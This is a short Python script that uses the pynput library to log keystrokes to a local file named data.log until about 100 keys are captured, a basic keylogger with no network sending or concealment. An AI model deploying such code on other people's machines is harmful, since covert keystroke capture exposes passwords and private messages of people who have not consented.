from pynput import keyboard


def get_keys_rb():
    with open('data.log', 'rb') as file:
        text = file.read()
        file.close()
    return text


def get_keys():
    with open('data.log', 'r') as file:
        text = file.read()
        file.close()
    return text


def add_key(key: str):
    keys = get_keys()
    with open('data.log', 'w') as file:
        file.write(f'{keys}{key} ')
        file.close()


def on_press(key):
    try:
        key_name = key.char
    except:
        key_name = key.name
    add_key(key_name)
    return False


def run():
    with open('data.log', 'w') as file:
        file.write(' ')
    while True:
        length = len(get_keys().split(' '))
        if length < 100:
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()
        else:
            with open('data.log') as f:
                lines = f.readlines()
            return lines



if __name__ == '__main__':
    run()